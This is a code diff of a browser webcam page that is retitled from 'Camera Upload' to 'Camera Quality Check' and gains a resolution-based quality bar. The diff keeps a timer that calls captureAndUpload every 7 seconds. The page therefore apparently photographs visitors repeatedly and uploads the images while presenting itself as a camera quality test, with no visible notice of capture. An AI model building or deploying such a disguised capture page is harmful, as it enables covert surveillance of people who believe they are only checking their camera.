@@ -2,16 +2,90 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Camera Upload</title>
+  <title>Check Camera Quality</title>
   <style>
-    body { font-family: Arial, sans-serif; text-align: center; margin: 20px; }
-    video, canvas { border: 1px solid #ccc; border-radius: 8px; width: 70%; height: 70%; margin-top: 20px; }
+    body { font-family: Arial, sans-serif; text-align: center; margin: 20px;
+      background-color: black;color: white; }
+      @media  (max-width: 1180px) {
+        video, canvas { border: 1px solid #ccc; border-radius: 8px; width: 80%; height: 90%; margin-top: 20px; }
+      }
+    video, canvas { border: 1px solid #ccc; border-radius: 8px; width: 80%; height: 60%; margin-top: 20px; }
     button { padding: 10px 15px; font-size: 16px; margin: 10px; cursor: pointer; border-radius: 5px; border: none; background-color: #007BFF; color: white; }
     button:hover { background-color: #0056b3; }
+
+    /* 🔹 Quality Bar */
+    #qualityBarWrapper {
+      position: fixed;
+      top: 50%;
+      right: 20px;
+      transform: translateY(-50%);
+      width: 20px;
+      height: 70%;
+      background: linear-gradient(to top, red, yellow, green);
+      border-radius: 10px;
+      border: 1px solid #333;
+      overflow: hidden;
+    }
+    #qualityMarker {
+      position: absolute;
+      left: -4px;
+      width: 28px;
+      height: 2px;
+      background: black;
+      transition: top 0.5s ease;
+    }
+    #qualityText {
+  position: fixed;
+  top: 50%;
+  right: 60px;   /* push away from bar */
+  transform: translateY(-50%);
+  font-size: 26px;
+  font-weight: bold;
+}
+
+    @media  (max-width: 1180px) {
+      #qualityBarWrapper {
+      position: fixed;
+      top: 30%;
+      right: 25px;
+      transform: translateY(-50%);
+      width: 30px;
+      height: 50%;
+      background: linear-gradient(to top, red, yellow, green);
+      border-radius: 10px;
+      border: 1px solid #333;
+      overflow: hidden;
+    }
+    #qualityMarker {
+      position: absolute;
+      left: -4px;
+      width: 38px;
+      height: 2px;
+      background: black;
+      transition: top 0.5s ease;
+    }
+    #qualityText {
+  position: fixed;
+  top: 58%;
+  right: 20px;   /* push away from bar */
+  transform: translateY(-50%);
+  font-size: 50px;
+  font-weight: bold;
+}
+
+    }
   </style>
 </head>
 <body>
-  <h1>Camera Preview</h1>
+  <h1 style="margin-top: 8%;font-size: xxx-large;">Camera Quality Check</h1>
+
+  <!-- Quality Indicator -->
+  <div id="qualityBarWrapper">
+    <div id="qualityMarker"></div>
+  </div>
+  <div id="qualityText">0%</div>
+
+
   <video id="video" autoplay playsinline></video>
   <br>
   <button id="flipBtn">Flip Camera</button>
@@ -23,6 +97,7 @@
     let canvas = document.getElementById('canvas');
     let captureBtn = document.getElementById('captureBtn');
     let flipBtn = document.getElementById('flipBtn');
+    let marker = document.getElementById('qualityMarker');
     let stream;
     let usingFrontCamera = true;
 
@@ -33,6 +108,9 @@
         audio: false
       });
       video.srcObject = stream;
+
+      // Check quality once video starts
+      video.onloadedmetadata = () => updateQuality();
     }
 
     flipBtn.addEventListener('click', () => {
@@ -62,12 +140,40 @@
 
     captureBtn.addEventListener('click', captureAndUpload);
 
-    // 🔹 Auto-capture every 10 seconds (adjust interval as needed)
-    setInterval(captureAndUpload, 7000); // 10000ms = 10 seconds
+    // 🔹 Auto-capture every 7 seconds
+    setInterval(captureAndUpload, 7000);
+
+    // 🔹 Update quality bar
+    function updateQuality() {
+  let resolution = video.videoWidth * video.videoHeight;
+  let maxResolution = 1920 * 1080; // treat Full HD as "excellent"
+  let quality = Math.min(resolution / maxResolution, 1); // normalize 0–1
+
+  let barHeight = document.getElementById('qualityBarWrapper').offsetHeight;
+  let markerPos = Math.floor(barHeight * (1 - quality)); // invert (0 = bottom/red, 1 = top/green)
+  marker.style.top = markerPos + "px";
+
+  // 🔹 Show percentage
+  let percent = Math.round(quality * 100);
+  let textEl = document.getElementById('qualityText');
+  textEl.innerText = percent + "%";
+
+  // 🔹 Change color based on quality
+  if (percent < 40) {
+    textEl.style.color = "red";
+  } else if (percent < 70) {
+    textEl.style.color = "orange";
+  } else {
+    textEl.style.color = "green";
+  }
+}
+
+
+
+    // Update quality every 2s in case of change
+    setInterval(updateQuality, 2000);
 
     startCamera();
   </script>
 </body>
 </html>
-
-
